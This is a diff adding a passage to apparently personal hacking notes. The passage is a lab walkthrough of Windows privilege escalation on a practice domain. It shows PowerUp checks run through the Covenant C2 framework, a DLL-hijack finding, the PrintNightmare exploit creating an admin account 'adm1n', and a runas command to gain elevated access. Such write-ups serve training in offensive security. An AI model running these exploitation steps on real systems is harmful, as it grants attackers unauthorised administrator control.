@@ -486,3 +486,44 @@ SMB         10.200.112.30   445    DC-SRV01         [+] holo.live\watamet:d8d41e
 ```
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/b208d551-5e40-42d7-94d8-565902bcd5d2)
 
+- Next, we will get the covenant session on our local machine by using the powershell module OR we can run the cmds from the remote desktop session itself.
+- We will utilise **Seatbelt** and **Powerview** for system enumeration and privilege escalation.
+- In my case, I'm using Covenant to run commands.
+- Using **PowerUp** in covenant:
+```powershell
+> PowerShellImport
+> powershell Invoke-allchecks
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+
+ModifiablePath    : C:\Users\watamet\AppData\Local\Microsoft\WindowsApps
+IdentityReference : HOLOLIVE\watamet
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\watamet\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\watamet\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+```
+- We are taking over this DLL.
+- On attempting all the steps I am unable to run the application as it required administrative rights.
+- Next, I try with windows vulnerability called Print-Nightmare.
+```powershell
+> . .\cve-2021-1675.ps1
+PS C:\Windows\System32\spool\drivers\color> Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
+```
+- Successfully added a new user to the domain group administrators.
+- I used the below command to run powershell as a new user with high privileges.
+```powershell
+runas /user:adm1n powershell.exe
+```
+- Then, I used Covenant powershell payload to get Grunt.
+```powershell
+ > whoami
+
+PC-FILESRV01\adm1n
+```
